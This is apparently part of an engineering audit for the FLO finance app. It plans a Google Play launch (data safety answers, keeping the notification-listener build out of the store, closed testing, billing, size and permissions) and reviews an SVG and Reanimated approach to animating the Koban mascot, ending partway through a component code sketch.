- Personal info: **Phone number** and names of *other people*. `split_people` holds manually entered contacts with an optional phone number. Declare it as optional.
- Photos: **Photos** (avatar, optional).
- Financial info: **Other financial info**. Transactions, balances, budgets and bills are all user-entered.
- App activity: **App interactions** and **Other user-generated content** (streaks, coins, notes, split entries).
- Device or other IDs: Expo/FCM **push token**.

Purposes: App functionality and Account management. Not advertising, not analytics.
- **Shared:** none. Supabase, Expo and Google FCM act as service providers, which Play excludes from "sharing".
- **Encrypted in transit:** Yes (HTTPS to Supabase and Expo).
- **Deletion:** Yes, in-app plus the web URL above.
- **Location:** Not collected. The timezone string from `TimezoneSync` is not location under Play's definitions.
- **Crash logs / diagnostics:** None today. Add them if you adopt Sentry or `expo-observe` (see P1).
- **Not collected:** SMS, call log, notifications. Correct only for `lite`; see the auto-detect item.

**Priority rationale:** The form is mandatory. A mismatch with real behaviour is a policy strike.

#### [P0] Auto-detect exclusion has never been verified in a built `lite` artifact
**Problem:** The only merged manifest on disk is from a **full** build. It contains `FloNotificationListenerService` with `BIND_NOTIFICATION_LISTENER_SERVICE` (merged-manifest lines 175-192). The `lite` exclusion depends on three things:
1. `app.config.js` rewrites `package.json` `expo.autolinking.exclude` as a side effect during config evaluation.
2. Autolinking reads that file at Gradle time on the EAS worker.
3. The JS gate `Constants.expoConfig.extra.autoDetectEnabled`, plus a conditional `require` in `lib/detect.js`.

`00-index.md` records a local `expo-modules-autolinking resolve` check (20 → 19 modules), but no `lite` AAB or APK has ever been inspected. The side effect also runs on your machine whenever `eas build --profile lite` evaluates config, which leaves `package.json` dirty. That makes it easy to commit the exclude, or to upload a tree in the wrong state. The `submit.full` profile also exists, and uploading the `full` AAB to *any* Play track (internal or closed included) would place a notification listener whose allowlist includes Google Messages in front of Play review under the same package.
**Change:**
- Build `lite-preview` first.
- Unzip the APK, or run `bundletool dump manifest` on the `lite` AAB, and confirm that there is no `FloNotificationListenerService`, no `DismissDetectionReceiver` and no `BIND_NOTIFICATION_LISTENER_SERVICE`. Confirm that `classes*.dex` contains no `com/anonymous/flo/detect`.
- Make that check a gate before every Play upload.
- Delete `submit.full` from `eas.json` so a `full` AAB cannot be submitted by accident. Keep `full-preview` for sideloading.
- After any local `--profile lite` run, check that `git status` shows `package.json` clean.

This follows the standing rule: keep auto-detect out of the store build, do not harden it.
**Priority rationale:** If the listener leaks, Play will flag it under the sensitive-permission and SMS policies and can suspend the account.

#### [P0] Closed testing requirement: 12 testers, 14 consecutive days
**Problem:** **Verified** on Play Console Help (answer 14151465). Personal developer accounts created after 2023-11-13 must run a closed test with **at least 12 testers opted in continuously for 14 days** before they can apply for production. A tester who opts out and back in restarts their clock. FLO has not started one. **Unverified:** whether your Console account is personal or organization. Organization accounts (D-U-N-S) are exempt.
**Change:**
- Recruit 15-20 testers so there is margin for drop-outs. Use a Google Group as the tester list.
- Upload the `lite` AAB to a **Closed testing** track and keep everyone opted in for 14+ days.
- Ship at least one update during the window, because Google's production-access questionnaire asks how you used tester feedback.
- Then apply for production from the Dashboard. Google's answer takes about 7 days (unverified).

**Priority rationale:** You cannot reach production without it, and it is the longest lead-time item, so start it as early as possible.

#### [P0] Payments are stubbed but prices are shown
**Problem:** `app/pro.js` shows ₹99 / ₹699 / ₹1,499 and an "Upgrade to Pro" button that only shows a toast ("Payments aren't live yet"). `app/shop.js` coin packs do the same. Play requires Google Play Billing (or User Choice Billing in India) for digital goods. Reviewers also treat priced buttons that do nothing as broken or misleading functionality. The stub is not a Billing violation by itself, because no money is taken, but it is a likely rejection or a 1-star magnet.
**Change (recommended):** For v1.0, **hide** the purchase surfaces: the Pro upgrade CTA and price cards, and coin-pack Buy. Keep the Free limits as they are (create-time gates). For the upsell sheet, either show a "Pro is coming" note with no price and no buy button, or remove it. Add Play Billing in a later release via **RevenueCat** (`react-native-purchases`, needs the dev client). Its webhook writes `entitlements`, which matches `IDEAS-subscription-and-store.md`. RevenueCat is a better fit than `expo-iap` here because the server-side entitlement table already exists, and it handles subscriptions, a lifetime product, consumable coins, and later iOS.
**Priority rationale:** Shipping dead purchase buttons risks rejection, and any real digital-goods purchase must go through Billing.

---

### P1: Needed for a quality launch

#### [P1] Play App Signing and upload key
**Problem:** No EAS Android credentials are confirmed (unverified). Local release APKs are debug-signed, which is fine only for sideloading.
**Change:** On the first `eas build -p android --profile lite`, let EAS generate the keystore. EAS's keystore then acts as the **upload key**, and Play App Signing holds the app signing key (mandatory for new apps that ship AABs). Download a backup with `eas credentials -p android`. If Google sign-in ever moves to a native SDK, register both the upload-key and app-signing-key SHA-1s in Firebase and Google Cloud. The current browser OAuth via Supabase does not need them.
**Priority rationale:** It is needed for the first upload. A lost upload key is recoverable but slow.

#### [P1] Versioning: switch to remote version source
**Problem:** `eas.json` has `appVersionSource: "local"` with `autoIncrement: true`, `app.json` has `versionCode: 2`, and `cli.version: ">= 12.0.0"` is stale. With a local source, EAS bumps `app.json` on the build machine, so local and cloud counts drift. `lite` and `full` share one package and therefore one versionCode space.
**Change:** Set `"appVersionSource": "remote"`. Run `eas build:version:set -p android` with a value above 2 (for example 10). Keep `autoIncrement` on `production`. Raise `cli.version` to the current eas-cli major. Keep `version: "1.0.0"` as the user-facing versionName and bump it by hand per release.
**Priority rationale:** Play rejects a reused versionCode. Remote counting removes that class of error.

#### [P1] Submit profile and first upload
**Problem:** `submit.lite: {}` has no service account and no track.
**Change:**
1. Create the app in Play Console.
2. Upload the first `lite` AAB **manually** through the Console. Expo's docs have long said the Play API needs one manual upload first; the skill claims `eas submit` can do the first submission. Treat that as unverified and do it manually to be safe.
3. Create a Google Cloud service account, link it in Play Console → API access, and keep the JSON outside git (`*.json` key path in `.gitignore` or an EAS file secret).
4. Configure:

```json
"submit": { "lite": { "android": { "serviceAccountKeyPath": "./play-sa.json", "track": "alpha", "releaseStatus": "completed" } } }
```

`alpha` is the closed track.
**Priority rationale:** It enables repeatable uploads during the 14-day test.

#### [P1] Reviewer and pre-launch-report access (demo account)
**Problem:** The app opens to the intro, onboarding and sign-in. The Play robo crawler cannot get past email sign-in or Google OAuth in a browser sheet, so the pre-launch report will cover only the intro screens. App review also needs credentials ("App access" section).
**Change:**
- Create a dedicated demo user, for example `play-review@<yourdomain>`. Do not reuse personal test accounts like `test@gmail.com`.
- Give it `onboarded_at` set and seeded sample data: 2 accounts, transactions, a budget, a bill and a split.
- Enter the credentials in Play Console → App content → App access and in Pre-launch report → Test account credentials.
- **Unverified:** whether Supabase email confirmation is on. If it is, confirm the demo user manually.
- **Unverified:** the Google OAuth consent screen must be in **"In production"** publishing status. In "Testing" status, only listed test users can sign in with Google, and public users would hit an error.

**Priority rationale:** Without credentials, review can stall or reject with "can't access app", and the pre-launch report has no value.

#### [P1] Crash and ANR reporting: none installed
**Problem:** There is no Sentry, Crashlytics, error boundary or `expo-observe`. Android vitals shows only aggregate counts, with no JS stack traces, and Hermes JS errors appear as generic native crashes.
**Change:** Add `@sentry/react-native` (Expo config plugin, source-map upload via EAS) or `expo-observe` (`ObserveErrorBoundary` + `reportError`). Add a root error boundary in `app/_layout.js` that shows a "Something went wrong, Reload" screen instead of a white screen. Declare **Crash logs** and **Diagnostics** in Data safety (collected, not shared, app functionality).
**Priority rationale:** The closed test is when you need crash data most, and production apps above Play's bad-behaviour thresholds lose visibility.

#### [P1] Size: 110 MB APK, R8 off, 50 MB of PNG art
**Problem:** `android.enableMinifyInReleaseBuilds` and `enableShrinkResourcesInReleaseBuilds` are both unset (false). `assets/` is 50 MB, mostly 1-2.5 MB PNGs: coin packs ~2.4 MB each, frugal badges ~1.7 MB each, `coin.png` 1.2 MB, plus `icon_backup.png`. The APK has 4 ABIs; the AAB splits by ABI, so per-device downloads will be smaller (estimate 40-55 MB, unverified until you have an AAB). The images are the main per-device cost, and decoding 2.5 MB PNGs also costs memory and risks jank or OOM on low-end Indian devices.
**Change:**
- Convert the game art to WebP at display resolution (most render below 300 px; 512 px is plenty). Expect 50 MB → under 5 MB.
- Delete `icon_backup.png` and any unreferenced art.
- Add `expo-build-properties` with `android.enableMinifyInReleaseBuilds: true` and `enableShrinkResourcesInReleaseBuilds: true`. Test a `lite-preview` build thoroughly, because R8 can strip classes used by reflection in Firebase, Expo modules or Supabase.
- Upload `mapping.txt` to Play for deobfuscation (EAS artifacts).

**Priority rationale:** Size drives install conversion in India on metered data. It is not a blocker.

#### [P1] Remove the unused CAMERA permission; tidy storage permissions
**Problem:** Merged manifest permissions (**verified**):
- Used: INTERNET, ACCESS_NETWORK_STATE, POST_NOTIFICATIONS, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, VIBRATE.
- From libraries: c2dm RECEIVE (FCM), READ_APP_BADGE, ~20 launcher-badge permissions (ShortcutBadger via expo-notifications), USE_BIOMETRIC and USE_FINGERPRINT (androidx.biometric via expo-secure-store), BIND_GET_INSTALL_REFERRER_SERVICE, CAMERA (expo-image-picker), READ/WRITE_EXTERNAL_STORAGE (image-picker, file-system; no `maxSdkVersion`).
- Absent: SCHEDULE_EXACT_ALARM, USE_EXACT_ALARM, READ_MEDIA_IMAGES/VIDEO, any `FOREGROUND_SERVICE*`, SYSTEM_ALERT_WINDOW, RECORD_AUDIO.

The avatar flow uses only `launchImageLibraryAsync` (the system Photo Picker on Android 13+), so **CAMERA is unused**. An unused camera permission shows on the listing and invites questions.
**Change:** Add `"android.permission.CAMERA"` to `android.blockedPermissions`, or set `"cameraPermission": false` in the expo-image-picker plugin. Optionally block USE_BIOMETRIC and USE_FINGERPRINT, since secure-store is not used with `requireAuthentication`. Leave READ_EXTERNAL_STORAGE alone; it does nothing on API 33+. Do not add READ_MEDIA_IMAGES: Play's Photo & Video policy restricts it, and the Photo Picker makes it unnecessary. The `requestMediaLibraryPermissionsAsync()` call in `EditProfileSheet.js:62` is probably unnecessary with the Photo Picker; check that it does not show a denial on Android 13+ (unverified).
**Priority rationale:** It is a cleaner permissions list and a simpler Data safety answer. No current permission would trigger a declaration form.

#### [P1] Financial features declaration, content rating, target audience
**Problem:** These App content sections are incomplete.
**Change:**
- **Financial features declaration** (required for every app): select the personal-finance option, worded like "budgeting / expense tracking / money management". The exact option label is unverified. Do **not** select loans, credit, payments, crypto or banking. FLO moves no money and gives no credit, so no licence is needed.
- **Target audience:** 18+. A finance app with accounts gains nothing from Families policy obligations.
- **Content rating (IARC):** no violence or gambling. The milestone spin wheel and chests use earned-only coins with no real-money purchase, so answer "no" to simulated gambling **only** while coins cannot be bought. Re-answer when coin packs go live, because purchasable currency plus a random reward can change the rating.
- Ads: No. News app: No. Government app: No. Health: No.

**Priority rationale:** These are required before production, and the gambling answer depends on the payments decision.

#### [P1] Store listing assets
**Problem:** None exist yet (unverified, nothing in the repo).
**Change:**
- 512×512 icon (from `icon.png`) and a 1024×500 feature graphic.
- 4-8 phone screenshots (1080×1920 or similar) from the demo account: home/today, transactions, analytics, budgets, reports, splits, streak.
- Short description (80 characters) and full description.

Avoid the words "AI", "auto-detect", "SMS" and "reads your bank messages". The `lite` build does none of that.
**Priority rationale:** Required before production. It can be prepared during the closed test.

#### [P1] Offline behaviour and ANR risks
**Problem:** There is no NetInfo or offline handling (grep found none). Every read hook hits Supabase directly. On flaky Indian mobile data, screens may show empty states or hang on spinners. **Unverified:** how each hook handles a rejected fetch. The robo crawler also runs some devices with poor networks. The main ANR risks are JS-thread jank from large PNG decoding and the 1-2.5 MB coin art rendered in lists. Nothing synchronous on the native main thread stood out.
**Change:** Test airplane mode on the sign-in, home, add-transaction and settings screens in a `lite-preview` build. At minimum, show an error or toast with retry instead of an infinite spinner, and make sure add-transaction failures are reported to the user, not silently dropped. Fix the image sizes (see the Size item).
**Priority rationale:** These are the most likely 1-star reasons and vitals hits in the target market.

#### [P1] Dependency hygiene that affects the release build
**Problem:** expo-doctor (**verified**) reports:
1. Duplicate `expo-constants` (18.0.14 and 17.1.8) and `expo-linking` (8.0.12 and 7.1.7), nested under `expo-share-intent` 5.0.0.
2. `android.androidNavigationBar` is no longer a valid app.json key in SDK 54, so it is silently ignored.

`.env` sets `EXPO_NO_DEPENDENCY_VALIDATION=1` and `.npmrc` sets `legacy-peer-deps=true`, which hide this class of problem. A merged-manifest note: `com.canhub.cropper.CropImageActivity` is `exported="true"`; it comes from the image cropper.
**Change:**
- Bump `expo-share-intent` to 5.1.1 (per the earlier scan) and re-run expo-doctor until clean.
- Move nav-bar config to the `expo-navigation-bar` plugin or remove it.
- Run `npx expo install --check` without the env flag before each store build.

**Priority rationale:** Duplicate native modules can cause runtime crashes that only appear in release builds.

---

### P2: Soon after launch

#### [P2] Add `expo-dev-client` and a real development profile
**Problem:** `development` has `developmentClient: true`, but `expo-dev-client` is not in `package.json`. RevenueCat and any future native module will need it.
**Change:** Run `npx expo install expo-dev-client`, then build `development` (`full` variant for your phone). Keep store builds on `lite`.
**Priority rationale:** It is needed for the Billing work and is not a launch blocker.

#### [P2] Monochrome (themed) adaptive icon
**Problem:** There is no `android.adaptiveIcon.monochromeImage`, so Android 13+ themed-icon users get a generic or blank glyph.
**Change:** Add a single-colour 1024 px foreground silhouette as `monochromeImage`.
**Priority rationale:** Polish. Play does not check it.

#### [P2] Play Billing via RevenueCat (Pro and coin packs)
**Problem:** Pro and coin packs are hidden at launch (see the P0 item).
**Change:**
- Create Play products: `pro_monthly` and `pro_annual` subscriptions, a `pro_lifetime` non-consumable, and coin consumables.
- Integrate `react-native-purchases` behind the existing `PRO_PRICING` and `entitlements` model.
- Add a RevenueCat → Supabase webhook (a new Edge Function; this is not AI, so it fits the standing rules).
- Update the Data safety form (Purchase history) and the IARC rating (purchasable currency).

India supports User Choice Billing as an alternative; Play Billing alone is simpler.
**Priority rationale:** It is the revenue path. Sequence it after you have a stable production build.

#### [P2] OTA updates with EAS Update
**Problem:** `expo-updates` is not installed, so every JS fix needs a full store build and review.
**Change:** Run `npx expo install expo-updates` and `eas update:configure`. Use the `appVersion` or `fingerprint` runtime policy and `preview`/`production` channels on the `lite-preview`/`lite` profiles. Never publish a `full`-only JS change to the store channel, because the JS gate depends on `extra.autoDetectEnabled`, which is baked in at build time.
**Priority rationale:** It makes hotfixes fast once real users are on the app.

#### [P2] Strip the personal-use SMS allowlist strings from the lite JS bundle
**Problem:** `lib/detect.js` (`PERSONAL_USE_EXTRA_PACKAGES`, `com.google.android.apps.messaging`) and the conditional `require('../modules/flo-notification-listener')` are still bundled into `lite`'s JS. They never execute, but they are visible to anyone who unpacks the bundle.
**Change:** Optional. Guard with `process.env.EXPO_PUBLIC_FLO_VARIANT` so Metro dead-code-eliminates it, or move the allowlist into the native module. This changes the build, not the feature, so it is consistent with the "don't harden auto-detect" rule.
**Priority rationale:** Low real risk, because nothing native or permission-related ships.

#### [P2] Repo hygiene
**Problem:**
- `hs_err_pid5576.log` (a JVM crash dump) is committed (commit `3510e92`).
- `google-services.json` is committed. That is acceptable, since Firebase client config is not secret, but it will change with the package rename.
- `assets/icon_backup.png` ships in the bundle if referenced (unverified).

**Change:** `git rm` the log and add `hs_err_pid*.log` to `.gitignore`. Restrict the Firebase API key to the app's package and SHA in Google Cloud.
**Priority rationale:** Hygiene.

---

### P3: Later

#### [P3] SDK upgrade (54 → 57+)
**Problem:** FLO is on SDK 54. The latest SDK is 58. SDK 54 already targets API 36 and is 16 KB-ready, so Play does not force an upgrade now. Next year's August target-API bump (expected API 37 in 2027, unverified) will.
**Change:** After launch, upgrade straight to SDK 57 with `expo@57.0.9` or later, skipping 55 and 56 (expo-upgrade skill: Hermes V1 memory regression with reanimated/worklets in 55, 56 and early 57). Remove `legacy-peer-deps` while doing it.
**Priority rationale:** It is not needed for this launch. Plan it before mid-2027.

#### [P3] App Store (iOS) blockers to note now
**Problem:** No `ios.bundleIdentifier` is set.
**Change:** Note these for the iOS launch:
- Choose a bundle id matching the Android id.
- Auto-detect is impossible on iOS. `lite` already behaves that way, and `disableIOS: true` is set on share-intent.
- **Sign in with Apple is required** (Guideline 4.8) because Google sign-in is offered; add Supabase's Apple provider.
- Payments must use StoreKit (RevenueCat covers both stores).
- Add a privacy nutrition label and `PrivacyInfo.xcprivacy` required-reason APIs (Expo generates most of it).
- Account deletion in app already satisfies 5.1.1(v).
- Fix the APNs key for expo-notifications.

**Priority rationale:** Second store, after Play.

#### [P3] Splash config form
**Problem:** It uses the legacy top-level `splash`. SDK 54 prefers the `expo-splash-screen` config plugin (unverified whether the legacy form is deprecated or just discouraged on 54).
**Change:** Move it to the `expo-splash-screen` plugin with `image`, `imageWidth` and `backgroundColor`, plus a `dark` variant.
**Priority rationale:** Cosmetic.

---

### Launch sequence

1. **Decide the identity.** Pick the permanent package id and add a Firebase Android app for it. Replace `google-services.json` and upload the FCM V1 key to EAS. Set `android.package`.
2. **Set up EAS.** Run `eas env:create` for the two Supabase vars and switch `appVersionSource` to remote with versionCode above 2. Bump cli.version, remove `submit.full`, and add a `submit.lite` closed-track config.
3. **Fix the build blockers.** Upgrade `expo-share-intent` to 5.1.1 (expo-doctor clean), fix `androidNavigationBar`, block CAMERA, add a root error boundary and Sentry or expo-observe, and convert the art to WebP.
4. **Hide the purchase surfaces** (Pro prices and CTA, coin-pack Buy) for v1.0.
5. **Build `lite-preview`.** Inspect its merged manifest and dex for any trace of the notification listener. Test offline behaviour and sign-in, including Google with a non-test Google account. Then enable R8 and shrinking and re-test.
6. **Publish the web pages:** privacy policy and account-deletion page. Add an in-app link to the policy.
7. **Set up Play Console.** Create the app and complete App content: privacy policy, App access (demo account), Data safety, financial features, target audience 18+, content rating, ads = no.
8. **Make the first upload.** Run `eas build -p android --profile lite` (EAS creates the upload key and you opt in to Play App Signing). Upload the AAB **manually** to Closed testing.
9. **Run the closed test.** Recruit 15-20 testers through a Google Group and keep them opted in for **14 consecutive days**. Watch the pre-launch report and vitals, ship at least one fix build through `eas submit`, and prepare the store listing (screenshots, feature graphic, descriptions) in parallel.
10. **Apply for production** from the Dashboard (production-access questionnaire). After approval, promote the same AAB to Production with a staged rollout (for example 20%).
11. **After launch:** add expo-dev-client, then RevenueCat and Play Billing (re-do the IARC rating and Data safety), EAS Update, the monochrome icon, then plan the SDK 57+ upgrade and the iOS work (Sign in with Apple, bundle id).

**Not verified here (needs a login or a build):**
- EAS env vars and credentials;
- the Console account type (personal or organization);
- Supabase email confirmation and Google OAuth consent-screen status;
- the actual `lite` AAB manifest and size;
- the exact Play option label in the financial-features declaration;
- whether `eas submit` can do the very first upload.

---

## 7. Mascot (Koban): motion, approach and placements

> Source: mascot audit. Short answer: yes, it can be done purely in code. Use layered react-native-svg animated with Reanimated 4, with no new native dependency.

Read-only audit, 2026-10-18. Sources: `.claude/features/IDEAS-koban-mascot-placement.md`, `05-koban-engagement.md`, `lib/koban.js`, `components/OnboardingMascot.js`, `components/StreakCelebration.js`, `components/TodayCard.js`, `app/streak.js`, `app/trophies.js`, `app/onboarding/**`, `assets/mascot/`, `assets/icon.png`, `assets/splash-icon.png`, `node_modules/expo/bundledNativeModules.json`, the npm registry, and the expo-animation skill.

### 1. Current state

**How Koban is drawn today:** as static, flattened 1024x1024 RGBA PNGs rendered with `<Image resizeMode="contain">`. There is no vector source, no layers, and no motion apart from a one-shot `ZoomIn` on `StreakCelebration`.

| Asset | Used in |
|---|---|
| 17 PNGs in `assets/mascot/` (3.7 MB total, about 165–330 KB each) | 15 onboarding screens via `OnboardingMascot` (190–215 px) plus `onboarding/done.js` |
| `assets/mascot/streak.png` (an **orange** Koban in sunglasses inside a flame) | Day 1 on `StreakCelebration`, the `app/streak.js` hero poster and badge grid, and the `app/trophies.js` badge grid |
| `assets/icon.png` | App icon. A **different drawing** of Koban (graphic lime-ringed eyes, head-and-shoulders, lime background) |
| `assets/notification-icon.png` | 96 px white silhouette (already correct according to the IDEAS doc) |
| `assets/splash-icon.png` | Not Koban. It is the ArrowMark zig-zag on off-white |
| `assets/mascot/hey_screen_bu.png` (275 KB) | **Unreferenced** backup that still ships in the repo |

**Why it reads "too simple":** I looked at `hey_screen`, `budget`, `money-leak`, `streak` and `icon`.

1. **It is a pure silhouette.** The body is one flat `#101010` fill with no secondary tone, rim light or inner line. A limb crossing the torso disappears into it: the hand-on-hip in `budget.png` and the paw on the magnifier in `money-leak.png` survive only as faint grey hairlines. All the character sits in the eyes and the outline.
2. **It never moves.** A mascot's personality comes from timing (blinks, an ear flick, a tail sway). A still image of a cartoon cat reads as clip art.
3. **The style is inconsistent.** The app icon, the onboarding body poses and the orange flame cat look like three different characters. The eye construction differs: green rings with highlights, lime crescents, or sunglasses. The ground shadow is green on `hey_screen` and grey on the others. Some edges show soft, JPEG-like halos, which suggests generated raster art rather than a model sheet.
4. **Framing and scale are poor.** About 40–50% of every 1024 px canvas is transparent padding, so a "210 px" mascot draws a cat roughly 110 px tall (the IDEAS doc already flags this).
5. **It does not work on dark surfaces.** A black cat on `#101010`/`#0B0B0B` is invisible. Day 1 currently avoids the problem by using the orange flame variant, which is a different-coloured character.

### 2. Can Koban be done purely in code?

Yes, and that is the recommendation. Koban's design is flat shapes with no texture: a silhouette, two eyes, a nose, whiskers and a tail. That is close to ideal for a hand-built SVG rig.

#### Approach comparison (for this exact stack: SDK 54, RN 0.81.5, React 19.1, Reanimated 4.1.1, worklets 0.5.1, svg 15.12.1, New Architecture)

| | (a) SVG layers + Reanimated 4 | (b) Lottie | (c) Rive | (d) Skia | (e) Sprite sheet |
|---|---|---|---|---|---|
| New dependency | **None.** svg 15.12.1 and Reanimated 4.1.1 are already installed and working | `lottie-react-native`. SDK 54 pins `~7.3.1`. The **latest 7.5.0 needs RN >= 0.84 / React >= 19.2**, so plain `npm install` breaks; it must go through `npx expo install` | Two packages exist. `rive-react-native` 9.8.6 is the legacy one. `@rive-app/react-native` 0.5.5 is pre-1.0 and Nitro-based, needing `react-native-nitro-modules >=0.35.10 <0.37`. Neither is in SDK 54's bundled list. Needs a dev-client rebuild | `@shopify/react-native-skia`. SDK 54 pins 2.2.12. **Latest 2.14 needs worklets >= 0.7**, which SDK 54 does not have |
| Authoring | Hand-authored or Figma/Illustrator SVG split into named groups. Motion is written in JS | Needs After Effects + Bodymovin (or LottieFiles Creator). Someone has to animate it | Rive editor, plus a state-machine designer | Code (paths drawn imperatively) | An illustrator draws N frames per pose |
| Theming (accent, dark-mode rim light) | **Native.** Pass `colors` as props. A rim stroke is one prop | Colour filters per keypath. Workable but awkward | Runtime data binding. Workable | Native | None. One sheet per colour |
| Size | About 5–15 KB of JS per pose | Small JSON plus about 1–2 MB of native lib | Rive runtime about 3–5 MB of native code plus a small `.riv` | About 4–6 MB of native code per ABI | Large: 24 frames at 512 px is roughly 1–3 MB per pose, plus heavy texture memory |
| Interactivity (tap, mood switching, eye tracking) | Full. Moods are props and loops are interruptible shared values | Segments only. No real state blending | **Best:** state machines, blending, inputs | Full | None |
| Runs on the UI thread | Yes (worklets) | Native player | Native renderer | Yes | Native |
| Risk | Lowest. Proven primitives already used in `Confetti`, `RewardBurst`, `MilestoneSpinWheel` | Version-pin trap; the motion pipeline lives outside the repo | Pre-1.0 package or legacy package; a new native surface in an app the owner calls bloated | Overkill for a few dozen paths | Rejects every requirement |
| Fits "app feels bloated" | **Yes** | Somewhat | No | No | No |

**Recommendation: (a), SVG layers + Reanimated 4.**

- It adds no native dependency.
- It is themeable, so it fixes the dark-surface problem with a rim-stroke prop instead of a new PNG.
- The motion it needs (blink, ear flick, tail sway, breathing, paw wave, look-at) is all transforms. That is the cheapest thing to animate.
- It removes the PNG-per-pose growth: one rig gives many moods.
- The expo-animation skill does name Lottie as the default for illustration. But it also says "cheapest that works." The Lottie case assumes someone authors in After Effects, and nobody on this project does. Koban's geometry is simple enough that code is cheaper.
- **Revisit Rive only if** a real state machine becomes a requirement (for example Koban reacting live to a slider or to typing). Nothing in the placement list needs that today, and `@rive-app/react-native` should reach 1.0 first.
- **Lottie stays a fallback** for one-off celebration scenes if an illustrator with After Effects joins later. Install it pinned via `npx expo install`, never `npm i`.

#### Implementation caveat that matters for performance

Do **not** drive whole-body motion through `useAnimatedProps` on SVG `<G transform>`. Every frame re-sets SVG native props and re-renders the SVG view on Android. Instead:

- **Rig with Views.** Each moving part (body, head, ear L, ear R, tail, paw) is its own small `<Svg>` inside an absolutely positioned `Animated.View`. Animate only `transform` and `opacity` on those Views, with `transformOrigin` set to the joint (supported on RN 0.81). This is pure UI-thread compositing with no SVG redraw.
- **Use `useAnimatedProps` only for tiny vector changes.** That means eyelid `ry` for blinks and pupil `cx`/`cy` for look-at. These are a couple of elements and change rarely: a blink is about 120 ms every 4–7 s.

#### What the SVG must look like (the layer spec)

Draw on one 256x256 viewBox and export **each named group as its own SVG** (or one master SVG with `id`s that a script splits). Put every pivot point in the group's metadata.

| Layer id | Contents | Pivot (transformOrigin) | Animates |
|---|---|---|---|
| `shadow` | Ground ellipse | centre | scaleX with breathing |
| `tail` | Tail, behind the body | base of the tail | rotate +/-6 deg sway |
| `body` | Torso + legs, with a **secondary tone** (#1E1E1E) and an inner line so limbs read | feet | scaleY 1.0 to 1.015 (breathe) |
| `paw-l` / `paw-r` | Arms as separate shapes with pink pads | shoulder | rotate for wave/beckon (maneki-neko) |
| `head` | Head shape, whiskers, nose | neck | small tilt, nod |
| `ear-l` / `ear-r` | Each ear, with an inner-ear tone | ear base | quick rotate flick |
| `eye-l` / `eye-r` | Sclera, iris ring (themeable accent, default lime `#BBDC12` to match the icon) | n/a | n/a |
| `pupil-l` / `pupil-r` | Pupil + highlight | eye centre | translate (look-at), scale (excited) |
| `lid-l` / `lid-r` | Body-colour lid shapes | top of eye | `ry`/scaleY blink; half-closed = sleepy |
| `brow` (optional) | Two short strokes | n/a | rotate for "concerned" |
| `rim` | A 2–3 px outline stroke of the silhouette in `colors.surface`/white at 60% | n/a | shown on dark surfaces only |
| `props/*` (later) | Coin (koban), clipboard, magnifier, bell | hand | swapped by `pose` |

**How to get there from the current art:**

1. **Model sheet first.** Base the rig on the **app-icon head**, which is the cleanest and most on-brand drawing, and the `hey_screen` body proportions.
2. **Use a vector illustrator, not an auto-trace.** Tracing these PNGs produces lumpy, bloated paths. Options:
   - a freelancer redraws it in Figma or Illustrator to the layer spec above (half a day to a day for the rig and 3 head expressions);
   - or the owner draws it in Figma with simple boolean shapes (the geometry is ellipses and rounded triangles).
3. **Export** as plain SVG (outlined strokes, no masks or filters, which react-native-svg handles poorly). Hand-convert to JSX components in `components/koban/parts.js`. Do not add `react-native-svg-transformer`: it adds a Metro dependency for about 12 small files.
4. **Unify the existing poses.** Re-export the onboarding PNGs from the new model so one character shows up everywhere, or keep them as PNGs for now (prop poses) and crop and compress them; see P1.

#### Component API sketch

```jsx
// components/koban/Koban.js
import { useEffect } from 'react';
import { Pressable, View } from 'react-native';
import Animated, {
  useSharedValue, useAnimatedStyle, useAnimatedProps, withRepeat, withSequence,
  withTiming, withDelay, cancelAnimation, Easing, ReduceMotion, useReducedMotion,
} from 'react-native-reanimated';
import { useIsFocused } from '@react-navigation/native';
import { useTheme } from '../../theme/ThemeContext';
import { Body, Head, EarL, EarR, Tail, PawR, Eyes } from './parts';

const EASE_IN_OUT = Easing.bezier(0.77, 0, 0.175, 1);
const RM = ReduceMotion.System;

/**
 * mood:   'idle' | 'happy' | 'sleepy' | 'proud' | 'concerned' | 'celebrate' | 'beckon'
 * size:   rendered height in dp (the rig is drawn at 256)
 * variant:'full' | 'head'  ('head' for 44px slots like TodayCard)
 * surface:'light' | 'dark' (dark turns the rim stroke on)
 * loop:   'idle' | 'once' | 'none'. Only full-screen, rare moments get 'idle'
 * label:  accessible name. Omit it and Koban is decorative (hidden from a11y)
 */
export default function Koban({ mood = 'idle', size = 160, variant = 'full',
  surface = 'light', loop = 'once', label, onPress }) {
  const { colors } = useTheme();
  const reduced = useReducedMotion();
  const focused = useIsFocused();          // pause when the screen is not focused
  const active = focused && !reduced && loop !== 'none';

  const breathe = useSharedValue(0);
  const tail = useSharedValue(0);
  const lid = useSharedValue(mood === 'sleepy' ? 0.55 : 0); // 0 open, 1 closed
  const paw = useSharedValue(0);

  useEffect(() => {
    if (!active) { [breathe, tail, paw].forEach(cancelAnimation); return; }
    const reps = loop === 'idle' ? -1 : 2;   // 'once' settles after 2 cycles
    breathe.set(withRepeat(withTiming(1, { duration: 1800, easing: EASE_IN_OUT, reduceMotion: RM }), reps, true));
    tail.set(withRepeat(withTiming(1, { duration: 1400, easing: EASE_IN_OUT, reduceMotion: RM }), reps, true));
    if (mood === 'beckon' || mood === 'happy') {
      paw.set(withRepeat(withSequence(
        withTiming(1, { duration: 220, reduceMotion: RM }),
        withTiming(0, { duration: 220, reduceMotion: RM })), 3));  // maneki-neko beckon, 3x
    }
    // Blink: a sequence on a jittered delay, re-armed from a JS timeout
    // (not per frame).
    return () => [breathe, tail, paw, lid].forEach(cancelAnimation);
  }, [active, mood, loop]);

  const bodyStyle = useAnimatedStyle(() => ({
    transform: [{ scaleY: 1 + breathe.get() * 0.015 }],
  }));
  const tailStyle = useAnimatedStyle(() => ({
    transform: [{ rotate: `${(tail.get() - 0.5) * 12}deg` }],
  }));
  const pawStyle = useAnimatedStyle(() => ({
    transform: [{ rotate: `${-paw.get() * 25}deg` }],
  }));
  const lidProps = useAnimatedProps(() => ({ scaleY: lid.get() }));

  const a11y = label
    ? { accessible: true, accessibilityRole: onPress ? 'button' : 'image', accessibilityLabel: label }
    : { accessibilityElementsHidden: true, importantForAccessibility: 'no-hide-descendants' };

  const Wrapper = onPress ? Pressable : View;
  return (
    <Wrapper onPress={onPress} hitSlop={8} style={{ width: size, height: size }} {...a11y}>
      {/* Each part: absolute Animated.View + transformOrigin at the joint */}
      <Animated.View style={[abs, { transformOrigin: '30% 80%' }, tailStyle]}><Tail fill={colors.kobanBody} /></Animated.View>
